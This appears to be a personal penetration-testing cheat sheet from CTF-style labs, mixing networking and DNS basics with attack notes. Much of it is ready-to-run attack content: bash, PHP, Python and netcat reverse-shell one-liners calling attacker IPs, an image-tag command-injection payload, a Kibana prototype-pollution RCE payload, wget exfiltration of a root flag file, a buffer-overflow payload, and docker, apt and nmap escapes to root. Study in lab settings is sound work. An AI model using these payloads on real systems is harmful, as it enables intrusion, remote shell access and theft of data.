

<br />
<br />

-sC flag in nmap runs a set of default NSE scripts, some of them are intrusive so this should not be run against real machines.

<br />
<br />

-A flag means agressive. It consists of:

 Enable OS detection, version detection, script scanning, and traceroute

<br />
<br />

nmap run without sudo does TCP scan (-sT) and with sudo SYN scan (-sS). SYN scan is better as it is a stealth one - sends RST flag to server so it avoids getting detected by firewall (for example). On the other side, it can destabilize weak applications on a server .

<br />
<br />

To check if there is a nse script for X service:

`grep "X" /usr/share/nmap/scripts/script.db`

<br />
<br />

Getting rev shell when there is a chance to write a comment

`<img src=http://10.6.46.150/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.6.46.150 '$IFS'4444')>`

<br />
<br />

SPAWNING INTTERACTING SHELL WITH PYTHON

python3 -c 'import pty;pty.spawn("/bin/bash")'

<br />
<br />

Listing all binaries with suid permission

find / -perm -u=s -type f 2>/dev/null

Finds all files with IP address inside it:

 find / -exec grep -l '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \; -type f 2>/dev/null

Finds while which has specific shasum

find / -type f -exec sha1sum {} \; 2>/dev/null | grep 9d54da7584015647ba052173b84d45e8007eba94


Finds all files owned by UID 502

find / -type f -uid 502 2>/dev/null




<br />
<br />

link to access a modified WP theme - `404.php` (to get rev shell)

`http://10.10.142.159/wp-content/themes/twentyfifteen/404.php`

<br />
<br />

if there is a filtering, it is needed to add command in backslashes e.g `l\s -la`

<br />
<br />

PHP REV SHELL ONE LINER

`php -r '$sock=fsockopen("10.6.46.150",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`

<br />
<br />

BASH REV SHELL ONELINER

bash -i >& /dev/tcp/10.2.46.111/4444 0>&1
 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.2.46.111 4444 >/tmp/f



<br />
<br />

There are many different converters to john format

`bin2john / zip2john / gpg2john`

<br />
<br />

7z is a file to extract

<br />
<br />

binwalk -->> tool to check of there is a zip file inside .png image

`binwalk -e file`

<br />
<br />

NMAP SHELL

Old version of nmap can be used to escalate to root

`nmap --version` to check version

`nmap --interactive` to enter interacttive model

and then `!sh` to get root

<br />
<br />

BRAINFUCK decoder

`https://www.splitbrain.org/_static/ook/`

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++++++++++.------------.+++++.>+++++++++++++++++++++++.<<++++++++++++++++++.>>-------------------.---------.++++++++++++++.++++++++++++.<++++++++++++++++++.+++++++++.<+++.+.>----.>++++.

<br />
<br />

XOR DECODER

`http://xor.pw/#`

<br />
<br />

SPEECH TO TEXT CONVERTER

`https://speech-to-text-demo.ng.bluemix.net/`

<br />
<br />

PHP 5 is vulnerable to "null byte injection" 

TL;DR adding '\00' in the end of command.

https://www.cvedetails.com/cve/CVE-2006-7243/

<br />
<br />

Becoming root with python script and with no read/write rights:

`mv script.py script.py.bak` ---> renaming original script

`echo "import pty" > script.py` ---> adding pty library = pseudo terminal utilities

`echo "pty.spawn('/bin/bash')" >> script.py` ---> adding a spawn function

and executing a script with path given in `sudo -l` e.g `sudo -u root /usr/bin/python /home/script.py`

<br />
<br />

`wget -r` downloads all files of a directory

<br />
<br />

Kibana runs usually on port `5601`

It is always good to check it's version (Management section) and if it is vulnerable to `protype pollution`.

TL;DR We run netcat and inject a payload in Timelion, run it and open Canvas to get shell in netcat's terminal.

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.6.46.150/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```
<br />
<br />

FINDING CAPABILITIES

`getcap -r / 2>/dev/null` 

`2>/dev/null` -
--> discards all STDERR

<br />
<br />

Nessus is an automated scanner which runs on port `8834`. It mixes functions of nmap, nikto or zap together and provides many profiles calles `Policies`

<br />
<br />

Finding password for admin based on request and error message:

`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.63.60 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -V`

Finding password knowing username:

`hydra -l $USER -P /usr/share/wordlists/rockyou.txt 10.10.147.74 $SERVICE`

$SERVICE --> ssh, ftp...

hydra -l bob -P 1000_common_passwords.txt -s 8080 http-get /protected

bruteforces site directly

<br />
<br />

Sometimes in order to access a hidden website, it is needed to turn off javascript in a browser.

In Firefox:

`about:config` --> `javascript enabled` --> change to `false`

<br />
<br />

Looking for 'word' inside a file:

`egrep 'word' file.txt` 

Shows how many times 'word' appears in a file:

`egrep -n 'word' file txt `

Looks for for a 'word' and shows in which line it is:

`grep -Hrn 'word' /path`

<br />
<br />

It is possible to bruteforce jwt tokens with `jwt-tool`

<br />
<br />

To launch script from anywhere it is not needed to add it to path but to:

`/usr/bin` and `/usr/local/bin`

It needs correct permission before `chmod 755`

<br />
<br />

Pushing files from one directory without constantly repeating commands:

`git commit -a -m "message here" && git push origin main`


<br />
<br />

While there is LFI, it is important to check if link is vulnerable to `php://filter`

`php://filter/convert.base64-encode/resource`


<br />
<br />

To demonstrate computer networking, there was introduced a model called OSI (Open Systems Interconnection), it consists of 7 layers:

APPLICATION

PRESENTATION

SESSION

TRANSPORTS

NETWORK

DATA LINK

PHYSICAL

To remember it `Anxious Pale Shakespeare Treated Nervously Drinks Patiently`

<br />
<br />

TCP (Transmission Control Protocol) model is as follows:

Application

Transport

Internet

Network inteface

It is a three-way-handshake = SYN - SYN/ACK - ACK

<br />
<br />

`strcmp` compares a string with another in C

`ltrace` is a tool great for reverse which runs an ELF step by step

`radare2 -d file` opens binary in debugging mode

`aaa` analyze all

`afl` lists all  functions

`pdf @function` views function structure

`px @rsi` views value of registry

`db 0x0040082c` sets breakpoint in specific point

`dc` runs a program

`ood 'argument'` sets an argument


<br />
<br />

`TTL` in domain name is `Time to Live` so a time, after which computer should request data of domain once again, instead of relying on copy from cache. Time is in seconds

`Recursive` DNS is a server which stores cache of domain names, so that computer knows where to ask first.

`root name server` is the one above `recursive` ones. Computer request info from it, if domain name is not stored in cache of `recursive`. There are `13` on whole world.

`TLD = Top Level Domain` are servers which store info for specific extensions `.com` etc. They are above (like roots) recursive.

`Authorative` name servers are used to store DNS records for domains directly. 

<br />
<br />

DNS request goes like this: `computer` checks `local cache`, then if nothing found requests `recursive` --> `root name` points where is a domain and gives response back --> recursive points to `top level domain` to get `extension` which responds back --> 

`recursive` request an `authorative` which has all parameters abotu domain 

<br />
<br />

`-d` stands for `data` in curl POST request e.g `curl -X POST -d "flag_please"`

`-c` stands for `cookie-jar` and is used in getting a cookie from website e.g `curl -c -  '$IP' `

`-b` sets a cookie, using GET requests e.g `curl -b "Name=Value" $IP"`


<br />
<br />

If there is `.yml` file involved, it is good to check if  `yaml deserialization attack` in python is possible

<br />
<br />

`pspy` is a tool which shows processes, crons run by all users on machine

<br />
<br />

`nc 10.10.211.152 110` to access `pop3` with netcat

<br />
<br />

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.30.36",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`


Python revererse shell one liner

<br />
<br />

`export PATH=$PATH` exports `$pwd` to path

<br />
<br />

`network.security.ports.banned.override`  allows to view http even if it is on other port than 80

<br />
<br />

If `/usr/bin/strings` has `suid` bit set, then for sure it is a way to get root

<br />
<br />

`sed` is a nice tool ro remove characters from file. 

Syntax is `sed 's/find/replace/' file`

<br />
<br />

`/dev/shm/` is an alternative for `/tmp` with higher possibility for all permissions

<br />
<br />

MONGODB

show databases

use db

show tables - shows collections

db.collection.find() - shows records

Mongo jest podatne na nosql injection przez operatory jak $ne itp.

<br />
<br />

Node zaleznie od wersji jest podatny na RCE, mozna podrobic wartosc cookie.

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

<br />
<br />

SAMBA

smbclient -L  \\\\10.10.158.27\\ -N

--> lists samba shares

smbclient \\\\10.10.158.27\\shares\\ -N

--> accesses specified share

get file

--> downloads specified file

<br />
<br />

REDIS

sudo apt install redis-tools -y

redis-cli -h IP -a password

--> connnects zith remote redis

LRANGE marketlist 1 20

--> shows key and range from to

<br />
<br />

RSYNC


rsync -av --list-only rsync://10.10.158.27:873

--> list files accessible via rsync

rsync -av rsync://USER@IP:873/DIRECTORY ./rsync

--> connnects as a user and copies locally the directory

rsync -ahv ./id_rsa.pub rsync://RSYNCUSER@IP:873/DIRECTORY/USER/.ssh/authorized_keys --inplace --no-o --no-g

--> copies our ssh to target user's ssh

<br />
<br />

SSH TUNNEL REDIRECTION

ssh -i id_rsa -L 8111:127.0.0.1:8111 USER@IP

--> using id_rsa we have to a server, we can redirect service from 8111 to local machine

<br />
<br />

GDB - buffer overflow

gdb -q file
set dissassembly-flavor intel
disas main

We get number of funtion before main e.g 400686 and we try to find the spot where program gets 'segmentation fault'

python -c "print('A'*39+'\x40\x06\x86')" | ./binary


If we want to hit 4000686 with python print, value has to be x86 x06 x40 = inverted

then we add two times 0 so finally:

(python -c "print('A'*40+'\x86\x06\x40\x00\x00')";cat) | nc  10.10.75.176 5700 

--> sends payload to netcat server


<br />
<br />

1. Docker Engine usually runs on 2375, therefore it is possible to curl it e.g

docker -H tcp://10.10.32.46:2375 COMMAND

and get info we need.


2. We can escalate to root mounting whole /var/run to alpine and runnning that container:

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

only if docker.sock has a sticky bit!!

<br />
<br />

curl IP/.well-known/security.txt

-->file with security info about reporting bugs etc.

<br />
<br />


priv esc using wget

sudo nc -lvpn 80

sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.11.30.36 

shows content of file in another terminal with netcat

<br />
<br />


If we have id_rsa.pub of a user, there should be some cron which sends it to authorized_keys

Therefore, we copy our id_rsa.pub to user's and should be able to get into server

<br />
<br />

When the shell exits the update command is actually executed.

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh

